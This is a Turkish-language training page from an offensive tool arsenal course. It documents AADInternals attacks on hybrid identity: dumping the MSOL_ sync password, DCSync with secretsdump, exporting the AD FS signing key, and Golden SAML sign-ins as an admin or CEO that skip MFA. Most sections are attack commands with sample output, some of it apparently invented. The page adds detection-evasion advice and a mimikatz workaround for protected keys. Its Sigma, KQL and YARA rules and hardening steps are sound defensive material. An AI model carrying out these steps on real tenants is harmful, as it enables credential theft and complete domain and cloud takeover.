# AADInternals

> **Kategori:** [14. AD FS, Bulut ve Hibrit Kimlik](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Azure AD (Microsoft Entra ID), Office 365, Azure AD Connect ve AD FS altyapılarını yönetmek, hibrit kimlik mekanizmalarını denetlemek ve `MSOL_` senkronizasyon parolaları ile Token-Signing sertifikalarını hasat etmek için geliştirilmiş kapsamlı PowerShell modülü.

---

## 1. Genel Bakış ve Amaç

Modern kurumsal şirketlerin büyük bir çoğunluğu, şirket içi (on-premises) Active Directory altyapısını Microsoft 365 ve Azure AD (yeni adıyla Microsoft Entra ID) bulut ortamıyla entegre ederek **hibrit kimlik (Hybrid Identity)** modelini kullanır. Bu entegrasyonun merkezinde, şirket içi nesneleri buluta senkronize eden **Azure AD Connect (AADC)** sunucuları ve federe kimlik doğrulama sağlayan **Active Directory Federation Services (AD FS)** sunucuları yer alır.

Azure AD Connect sunucusu, parola özetlerini şirket içinden buluta aktarmak (Password Hash Sync - PHS) için şirket içi Active Directory üzerinde `MSOL_` önekiyle başlayan özel bir servis hesabı oluşturur. Bu `MSOL_` hesabı, etki alanı kökünde doğrudan **DCSync (Replicating Directory Changes All)** haklarına sahiptir. AADC sunucusu yerel veritabanında (`ADSync` LocalDB veya SQL Server) bu hesabın açık parolasını ve buluta bağlanan senkronizasyon anahtarlarını şifrelenmiş olarak depolar.

**AADInternals** (Dr. Nestori Syynimaa / @NestoriSyynimaa tarafından geliştirilmiştir), hibrit kimlik ve bulut güvenliği alanındaki en yetenekli PowerShell araç setidir. Araç:
* Azure AD Connect sunucusunun yerel veritabanındaki DPAPI ve CNG şifreleme anahtarlarını çözerek `MSOL_` servis hesabının düz metin parolasını açığa çıkarır (`Get-AADIntSyncCredentials`). Bu parola ele geçirildiği anda şirket içindeki tüm etki alanı parola özetleri DCSync ile dökülebilir.
* AD FS sunucularında çalışan Token-Signing özel anahtarını ve sertifikalarını dışa aktarır (`Export-AADIntADFSSigningCertificate`); bu sayede bulutta istenen herhangi bir kullanıcı adına sahte SAML assertion üreterek (Golden SAML) parola ve MFA gerekmeksizin bulut ortamına sızılmasını sağlar.
* Seamless SSO için kullanılan `AZUREADSSOACC` bilgisayar hesabının Kerberos anahtarlarını çeker.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                            AADINTERNALS MIMARI AKIŞI                              |
+-----------------------------------------------------------------------------------+
  [Azure AD Connect Sunucusu]                         [On-Premises Domain Controller]
   (AADInternals PowerShell)                                  (Active Directory)
             |                                                       |
             |--- 1. Get-AADIntSyncCredentials --------------------->|
             |       (Yerel ADSync Veritabanı Okunur)                |
             |       (LocalDB\.\ADSync -> mms tablosu)               |
             |                                                       |
             |--- 2. DPAPI / CNG Anahtarları Çözülür                 |
             |       [MSOL_xxxx Hesabı Düz Metin Parolası Alınır]    |
             |                                                       |
             |--- 3. MSOL_ Hesabı ile DCSync Başlatılır ------------>|--- 3. DRSUAPI RPC
             |       (impacket-secretsdump veya mimikatz)            |       (Replication)
             |<-- 4. Tüm Domain Kullanıcı Parola Hash'leri Döner ----|
             |
  [AD FS Sunucusu / Bulut Yolu (Entra ID)]
             |
             |--- 5. Export-AADIntADFSSigningCertificate -----------> [Token-Signing Sertifikası]
             |       (Özel Anahtar / Private Key Çalınır)            | (Golden SAML Vektörü)
             |                                                       |
             |--- 6. New-AADIntSAMLToken (Global Admin Kimliği) ---->|
             |       (SAML İddiası İmzalanır)                        |
             v                                                       v
  [Sonuç: Şirket İçi DC Tam Hakları + Bulut Entra ID Global Admin Erişimi!]
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Hibrit Pivot Köprüsü** | Şirket içinden buluta, buluttan şirket içine sıçrar. | On-prem ve Cloud güvenliğini tek çerçevede birleştirir. |
| **Doğrudan DCSync Erişimi** | `MSOL_` hesabı üzerinden tüm AD şifrelerini çeker. | Domain Admin olmadan DCSync hakkı elde etmeyi sağlar. |
| **Golden SAML Yeteneği** | AD FS Token-Signing anahtarıyla sahte bilet basar. | Buluttaki tüm MFA ve parola denetimlerini tamamen atlatır. |
| **Seamless SSO Hasadı** | `AZUREADSSOACC` Kerberos hash'lerini ele geçirir. | Buluta yönelik Kerberoasting ve Silver Ticket sağlar. |
| **Zengin API Desteği** | Microsoft Graph, Azure AD Core API'lerini doğrudan konuşur.| Resmi Azure CLI sınırlarını ve denetimlerini aşar. |

### Karşılaştırma Tablosu

| Özellik | AADInternals | ADFSpoof | ROADtools (roadrecon) | AzureHound |
| :--- | :--- | :--- | :--- | :--- |
| **Çalışma Ortamı** | PowerShell (Windows / Linux) | Python (Linux) | Python (Linux / Windows) | Go Binary / C# |
| **AD Connect Hasadı** | Evet (`Get-AADIntSyncCredentials`)| Hayır | Hayır | Hayır |
| **Golden SAML Üretimi** | Evet (Yerleşik Fonksiyon) | Evet (Yalnızca SAML üretir) | Hayır | Hayır |
| **Azure AD Keşif / Harita**| Evet (Kısmi Keşif) | Hayır | Evet (Kapsamlı Veritabanı) | Evet (Grafiksel Saldırı Yolları)|
| **Kullanım Alanı** | Hem İstismar Hem Denetim | Yalnızca SAML Sahteciliği | Keşif ve Analiz | Graf Tabanlı Bulut Analizi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

AADInternals standart PowerShell modülü olarak yüklenir ve zengin cmdlet kütüphanesi üzerinden çağrılır:

```powershell
Import-Module AADInternals
Get-Command -Module AADInternals
```

### Desteklenen Kritik Cmdlet'ler ve Parametreler

| Cmdlet Adı | Açıklama | Kritik Parametreler |
| :--- | :--- | :--- |
| `Get-AADIntSyncCredentials` | AADC sunucusunda `MSOL_` ve bulut senkronizasyon parolalarını dökebilir. | Parametresiz (Yerel Yönetici gerekir) |
| `Export-AADIntADFSSigningCertificate` | AD FS sunucusundan Token-Signing sertifikasını ve PFX anahtarını çıkarır. | Parametresiz (AD FS servisi bağlamı) |
| `New-AADIntSAMLToken` | Çalınan Token-Signing sertifikasıyla sahte SAML 1.1 / 2.0 belirteci üretir. | `-SigningCertificate`, `-ImmutableId`, `-Issuer` |
| `Open-AADIntOffice365Portal` | Üretilen SAML belirteciyle varsayılan tarayıcıda M365 oturumu açar. | `-ImmutableId`, `-SigningCertificate` |
| `Get-AADIntTenantID` | Hedef alan adının Azure AD Kiracı Kimliğini (Tenant ID) döker. | `-Domain <domain.com>` |
| `Get-AADIntSSOConfiguration` | Seamless SSO yapılandırmasını ve etki alanı Kerberos ayarlarını listeler. | `-Domain <domain.com>` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Azure AD Connect Sunucusundan MSOL_ Senkronizasyon Parolasını Çıkarma
AADC sunucusunda yerel yönetici haklarıyla çalışan bir oturumda `ADSync` veritabanındaki hesapları dökme:

```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```

**Konsol Çıktı Analizi:**
```
UserName                    : MSOL_5a812bc41920
Password                    : 9!kL#mQ8123aZxP0192837465ab  <-- DÜZ METİN PAROLA
AccountType                 : On-Premises (Active Directory)
Domain                      : corp.local

UserName                    : Sync_AADC_Cloud@corp.onmicrosoft.com
Password                    : BulutSenkronizasyonTokenVeSifresi...
AccountType                 : Cloud (Azure Active Directory)
```

### Senaryo 2: AD FS Sunucusundan Token-Signing Sertifikasını ve Özel Anahtarı Çıkarma
AD FS sunucusunda çalışan bir oturumda imzalama sertifikasını PFX formatında dışa aktarma:

```powershell
Export-AADIntADFSSigningCertificate -ExportPrivateKey
```

**Konsol Çıktı Analizi:**
```
Thumbprint                               Subject
----------                               -------
A91284B01284C102938475610293847561029384 CN=ADFS Signing - adfs.corp.local

[+] Private key successfully extracted from CNG/KSP storage!
[+] Certificate exported to memory as X509Certificate2.
```

### Senaryo 3: Çıkarılan MSOL_ Hesabı ile Şirket İçi DC Üzerinde DCSync Çalıştırma
Elde edilen `MSOL_` hesabı Active Directory'de `Replicating Directory Changes` hakkına sahip olduğundan, doğrudan secretsdump ile tüm etki alanı hash'lerini çekme:

```bash
impacket-secretsdump 'corp.local/MSOL_5a812bc41920:9!kL#mQ8123aZxP0192837465ab@192.168.1.10' -just-dc
```

**Konsol Çıktı Analizi:**
```
Impacket v0.12.0 - Copyright Fortra, LLC
[*] Target: 192.168.1.10
[*] Dumping Domain Credentials via DRSUAPI using MSOL_ account...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:329153f560eb344c3f9e3ec4e086166f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:99812487abcdf129847128947bcadfae:::
[+] Successfully extracted all domain credentials!
```

### Senaryo 4: Hedef Alan Adının Kiracı (Tenant) ve Federasyon Durumunu Sorgulama
Hedef kurumun bulut kiracı kimliğini (Tenant ID) ve AD FS federasyon ayarlarını anonim olarak sorgulama:

```powershell
Get-AADIntTenantID -Domain "corp.com"
Get-AADIntTenantDomains -Domain "corp.com"
```

**Konsol Çıktı Analizi:**
```
Tenant ID   : 4f912c01-8812-4c22-b991-112233445566
Name        : Corporate Cloud Environment
Authentication: Federated (AD FS Endpoint: https://adfs.corp.com/adfs/ls)
```

### Senaryo 5: Sahte SAML Token (Golden SAML) Üreterek Bulutta Oturum Açma
Çalınan imzalama sertifikasını kullanarak, buluttaki Global Admin kullanıcısı adına MFA olmadan oturum açma:

```powershell
$cert = Export-AADIntADFSSigningCertificate -ExportPrivateKey
Open-AADIntOffice365Portal -ImmutableId "m9812401284==" -UserPrincipalName "admin@corp.com" -SigningCertificate $cert
```

**Konsol Çıktı Analizi:**
```
[*] Generating SAML 1.1 / 2.0 Assertion token...
[*] Signing assertion with exported AD FS Private Key...
[*] Launching default browser with signed SAML assertion...
[+] Successfully bypassed cloud authentication! Office 365 Portal opened as admin@corp.com.
```

### Senaryo 6: Seamless SSO Kerberos Hesap Bilgilerini Sorgulama
Azure AD Seamless SSO için etki alanında oluşturulan `AZUREADSSOACC` bilgisayar hesabının şifreleme anahtarlarını çekme:

```powershell
Get-AADIntSSOConfiguration -Domain "corp.com"
```

**Konsol Çıktı Analizi:**
```
DesktopSsoEnabled : True
Domain            : corp.com
Account           : AZUREADSSOACC$
KerberosRealm     : USERSEARCH.MICROSOFT.COM
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `Cannot connect to ADSync LocalDB (Access is denied)` | PowerShell komut istemi yerel yönetici (Run as Administrator) olarak başlatılmamış. | PowerShell'i yönetici olarak açın veya AADC sunucusunda SYSTEM yetkisine geçin. |
| `Failed to decrypt key: The system cannot find the file specified` | ADSync LocalDB örneği varsayılan konumda değil veya adlandırılmış bir SQL Server örneği kullanılıyor. | `Services.msc` üzerinden `ADSync` servisinin bağlı olduğu SQL bağlantı dizesini kontrol edin ve `-Server` parametresini tanımlayın. |
| `AD FS Token-Signing private key is not exportable` | AD FS sunucusunda sertifika özel anahtarı Donanımsal Güvenlik Modülü (HSM) veya KSP korumalı olarak işaretlenmiş. | Mimikatz veya bellek kütüphaneleriyle `crypto::cng` veya `crypto::certificates /export` çağrısı yaparak kısıtlamayı atlatın. |
| `Conditional Access Policy blocked the sign-in` | Bulutta oluşturulan sahte SAML token geçerli ancak Azure AD Koşullu Erişim (CAP) güvenilen cihaz veya uyumlu IP zorunlu kılıyor. | Bulut kullanıcısının konum kurallarını inceleyin; şirket içi güvenilen çıkış IP'si üzerinden tünelleme yaparak bağlanın. |
| `ImmutableId mismatch / User not found in tenant` | SAML assertion içerisindeki `ImmutableId` değeri, Azure AD'deki kullanıcının `onPremisesSourceAnchor` değeriyle uyuşmuyor. | Şirket içi AD'den kullanıcının `objectGUID` değerini alıp Base64 formatına çevirin (`[Convert]::ToBase64String($guid.ToByteArray())`). |
| `Missing dependency: Microsoft.IdentityModel.Tokens` | Modülün ihtiyaç duyduğu JWT ve şifreleme DLL kütüphaneleri PowerShell dizininde bulunamadı. | `Install-Module AADInternals -Force` komutuyla modülü tüm bağımlılıklarıyla birlikte yeniden kurun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA]
0 --------------[5.5 - HYBRID CREDENTIAL ACCESS]-------------- 10
  - Şirket İçi Seviye: AADC sunucusunda yerel veritabanı okuma ve DC'de MSOL_ DCSync (Yüksek Öncelikli Alarm)
  - Bulut Seviyesi: Olağan dışı SAML token oluşturma ve yeni konumdan oturum açma (Entra ID Identity Protection)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Azure AD Connect Sunucusu (Security Event ID 4688 / Sysmon Event ID 1):**
  * `powershell.exe` süreci altında `AADInternals` fonksiyonlarının çağrılması.
* **On-Premises Domain Controller (Security Event ID 4662 - DS Access):**
  * `MSOL_` hesabı tarafından DCSync replication çağrısı yapılması (`DS-Replication-Get-Changes-All`). Meşru senkronizasyon haricindeki ani replikasyon talepleri MDI tarafından anında yakalanır.
* **Entra ID / Azure AD Sign-in Logs:**
  * **İmza Uyumsuzluğu:** SAML Token-Signing sertifikası ile giriş yapıldığında, kullanıcı için oluşturulan IP adresi ve cihaz bilgileri bulut telemetrisine kaydedilir.
  * **Risk Düzeyi:** "Unfamiliar sign-in properties" veya "Atypical travel" alarmları tetiklenebilir.

### 5.2 Ağ ve EDR İmzaları

* **AADC LocalDB Bellek Erişimi:**
  Normalde yalnızca `Microsoft.Azure.ActiveDirectory.Synchronization.Engine.exe` süreci `ADSync` veritabanını okur. Bir PowerShell veya cmd sürecinin bu veritabanına erişmesi, EDR sensörleri için şüpheli aktivitedir.
* **Microsoft Graph & Azure API Çağrıları:**
  AADInternals'ın kullandığı özelleştirilmiş User-Agent ve API istek kalıpları Microsoft Cloud App Security (Defender for Cloud Apps) tarafından izlenir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Credential Access** | `T1556.007` | Modify Authentication Process: Hybrid Identity | Azure AD Connect senkronizasyon anahtarlarını çalma. |
| **Credential Access** | `T1606.002` | Forge Web Credentials: Golden SAML | Sahte SAML assertion ile bulut kimlik doğrulaması. |
| **Credential Access** | `T1003.006` | OS Credential Dumping: DCSync | `MSOL_` hesabı üzerinden etki alanı hash'lerini dökme. |
| **Discovery** | `T1087.004` | Account Discovery: Cloud Account | Kiracı kullanıcı ve domain yapılandırmalarını keşfetme. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **PowerShell Script Block (4104)** | Hassas AADC ve AD FS işlemlerinde fonksiyon adları karıştırılmalı veya doğrudan unmanaged C# DLL kütüphaneleri çağrılmalıdır. |
| **MSOL_ DCSync Tespiti** | DCSync talebi AADC sunucusunun kendi IP adresi üzerinden proxy/pivot yapılarak gönderilmelidir (DC farklı IP'den gelen MSOL_ çağrılarını alarm üretir). |
| **Bulut Konum Anomalisi** | Golden SAML ile giriş yaparken kurumun meşru VPN veya ofis çıkış IP aralığı kullanılmalıdır. |
| **Bellekteki Özel Anahtarlar** | Çıkarılan PFX sertifikaları diske yazılmamalı; doğrudan RAM'de `$cert` değişkeninde tutulup işlem bitince imha edilmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: Azure AD Connect Veritabanından Şüpheli Kimlik Bilgisi Çıkarma
```yaml
title: AADC ADSync Veritabanindan Supheli Kimlik Hasadi (AADInternals)
id: f1294a02-5512-4c22-b881-112244aa7788
status: experimental
description: Azure AD Connect sunucusu uzerinde powershell tarafindan ADSync LocalDB veritabaninin okunmasini ve DPAPI anahtarlarinin cozulmesini yakalar.
references:
    - https://attack.mitre.org/techniques/T1556/007/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - 'Get-AADIntSyncCredentials'
            - 'ADSync'
            - 'Export-AADIntADFSSigningCertificate'
    condition: selection
falsepositives:
    - Guvenlik ekiplerinin planli denetim scriptleri.
level: critical
tags:
    - attack.credential_access
    - attack.t1556.007
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// Azure AD Connect makinesinde olusan supheli powershell aktivitelerini ve eszamanli MSOL_ DCSync olaylarini korele eder
SecurityEvent
| where TimeGenerated >= ago(24h)
| where EventID == 4688
| where CommandLine has_any ("AADInternals", "Get-AADIntSyncCredentials", "Export-AADIntADFS")
| project TimeGenerated, Computer, Account, CommandLine
| join kind=inner (
    SecurityEvent
    | where EventID == 4662
    | where Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" // DS-Replication-Get-Changes-All
    | project DCSyncTime = TimeGenerated, DCName = Computer, AccountWhoDCSynced = Account
) on $left.Account == $right.AccountWhoDCSynced
```

#### YARA Kuralı: AADInternals PowerShell Modül İmzası
```yara
rule Threat_Script_AADInternals {
    meta:
        description = "AADInternals PowerShell hibrit saldiri kutuphanesini tespit eder"
        author = "AD Guvenlik Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "AADInternals" ascii wide nocase
        $s2 = "Get-AADIntSyncCredentials" ascii wide nocase
        $s3 = "Export-AADIntADFSSigningCertificate" ascii wide nocase
        $s4 = "New-AADIntSAMLToken" ascii wide nocase
        $s5 = "Open-AADIntOffice365Portal" ascii wide nocase
    condition:
        2 of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **Tier-0 Sunucu İzolasyonu:** Azure AD Connect ve AD FS sunucuları en az Domain Controller kadar kritik Tier-0 sistemlerdir. Bu sunucularda yerel yönetici hakkı olan herkes şirket içi ve bulutun tamamını ele geçirebilir. Standart yöneticilerin erişimi engellenmelidir.
2. **MSOL_ DCSync İzleme:** Microsoft Defender for Identity (MDI) üzerinde AADC IP adresi haricindeki herhangi bir makineden gelen `MSOL_` oturumları ve DCSync istekleri derhal otomatik engellemeye alınmalıdır.
3. **Bulut Yalnızca (Cloud-Only) Yönetici Hesapları:** Global Admin ve kritik bulut rolleri kesinlikle şirket içi Active Directory'den senkronize edilmemeli; yalnızca bulutta yaşayan bağımsız hesaplar olmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. AD Connect Senkronizasyon Parolalarını Çıkarma
```powershell
Get-AADIntSyncCredentials
```
* **Ne Yapar?:** AADC sunucusunda `MSOL_` hesabının ve bulut servis hesabının düz metin parolalarını çözer.
* **Ne Zaman Kullanılır?:** AADC sunucusuna yerel yönetici erişimi sağlandığında şirket içi DCSync parolasını almak için.
* **Parametreler:** Parametresiz çalıştırma.

#### 2. AD FS Token-Signing Sertifikasını Dışa Aktarma
```powershell
Export-AADIntADFSSigningCertificate -ExportPrivateKey
```
* **Ne Yapar?:** AD FS sunucusundaki imzalama sertifikasını ve özel anahtarını belleğe çıkarır.
* **Ne Zaman Kullanılır?:** Golden SAML saldırısı hazırlığında imza anahtarını elde etmek için.
* **Parametreler:** `-ExportPrivateKey` özel anahtarı dahil eder.

#### 3. Seamless SSO Kerberos Yapılandırmasını Çekme
```powershell
Get-AADIntSSOConfiguration -Domain "corp.com"
```
* **Ne Yapar?:** Masaüstü tekil oturum açma için kullanılan `AZUREADSSOACC` hesabının yapılandırmasını listeler.
* **Ne Zaman Kullanılır?:** Seamless SSO Kerberos bilet sahteciliği yaparken.
* **Parametreler:** `-Domain <domain>`.

#### 4. Kiracı ID (Tenant ID) ve Alan Adı Sorgulama
```powershell
Get-AADIntTenantID -Domain "targetcompany.com"
```
* **Ne Yapar?:** Hedef kurumun Azure AD Tenant GUID değerini ve bulut kimlik durumunu döker.
* **Ne Zaman Kullanılır?:** Dış keşif (Recon) ve bulut saldırı hazırlığı aşamasında.
* **Parametreler:** `-Domain <Hedef_Alan_Adı>`.

#### 5. Sahte SAML Token ile Bulut Portalı Açma
```powershell
Open-AADIntOffice365Portal -ImmutableId "BASE64_GUID" -UserPrincipalName "ceo@corp.com" -SigningCertificate $cert
```
* **Ne Yapar?:** Çalınan sertifika ile imzalanmış sahte belirteç üreterek hedef kullanıcının portalını açar.
* **Ne Zaman Kullanılır?:** Parola ve MFA olmadan bulutta hedef kullanıcının hesabına sızmak için.
* **Parametreler:** `-ImmutableId`, `-UserPrincipalName`, `-SigningCertificate`.

#### 6. Etki Alanı Federasyon Ayarlarını İnceleme
```powershell
Get-AADIntTenantDomains -Domain "corp.com"
```
* **Ne Yapar?:** Kiracıdaki alan adlarının yönetilen (Managed) mi yoksa federe (Federated) mi olduğunu raporlar.
* **Ne Zaman Kullanılır?:** AD FS saldırı vektörünün uygulanabilirliğini anlamak için.
* **Parametreler:** `-Domain <domain>`.

#### 7. Modülü PowerShell Galerisinden Kurma
```powershell
Install-Module -Name AADInternals -Scope CurrentUser -Force
```
* **Ne Yapar?:** AADInternals modülünü yönetici yetkisi gerektirmeden yerel kullanıcı profiline indirir.
* **Ne Zaman Kullanılır?:** Denetim istasyonunda aracı hazır hale getirmek için.
* **Parametreler:** `-Scope CurrentUser`.

#### 8. MSOL_ Hesabı ile secretsdump Çalıştırma
```bash
impacket-secretsdump 'corp.local/MSOL_ACCOUNT:PASSWORD@DC_IP' -just-dc
```
* **Ne Yapar?:** AADInternals ile elde edilen parola ile DC üzerinden tüm AD hash'lerini döküm alır.
* **Ne Zaman Kullanılır?:** AADC senkronizasyon şifresi elde edildikten hemen sonra.
* **Parametreler:** `-just-dc` DRSUAPI replikasyonu.

#### 9. Kullanıcı Nesnesinin ImmutableId Değerini Hesaplama
```powershell
[Convert]::ToBase64String((Get-ADUser -Identity "ceo").objectGUID.ToByteArray())
```
* **Ne Yapar?:** Şirket içi Active Directory kullanıcısının GUID'ini SAML için gereken Base64 dizesine çevirir.
* **Ne Zaman Kullanılır?:** Golden SAML belirteci hazırlarken hedef kullanıcının kimlik eşlemesini yapmak için.
* **Parametreler:** PowerShell `Get-ADUser`.

#### 10. Bellekteki Hassas Sertifika Değişkenlerini Temizleme
```powershell
$cert = $null; [GC]::Collect()
```
* **Ne Yapar?:** RAM'de tutulan AD FS imzalama anahtarını sıfırlar ve çöp toplayıcıyı çalıştırır.
* **Ne Zaman Kullanılır?:** Test bittiğinde özel anahtarın bellek dökümlerinde kalmasını önlemek için.
* **Parametreler:** `$null` ve `[GC]::Collect()`.

---

## Kaynaklar
* [Dr. Nestori Syynimaa Resmi AADInternals Dokümantasyonu](https://aadinternals.com/)
* [AADInternals Resmi GitHub Deposu](https://github.com/Gerenios/AADInternals)
* [Microsoft Dokümantasyonu: Azure AD Connect Sync Service Account Permissions](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-install-existing-tenant)
* [MITRE ATT&CK: Modify Authentication Process: Hybrid Identity (T1556.007)](https://attack.mitre.org/techniques/T1556/007/)
* [MITRE ATT&CK: Forge Web Credentials: Golden SAML (T1606.002)](https://attack.mitre.org/techniques/T1606/002/)

---

> **Önceki:** [← noPac / sam-the-admin (Kategori 13)](../Kategori_13_Tarihi_ve_Kritik_Zafiyet_Araclari/noPac_sam-the-admin.md) · **Sonraki:** [ADFSpoof →](./ADFSpoof.md)
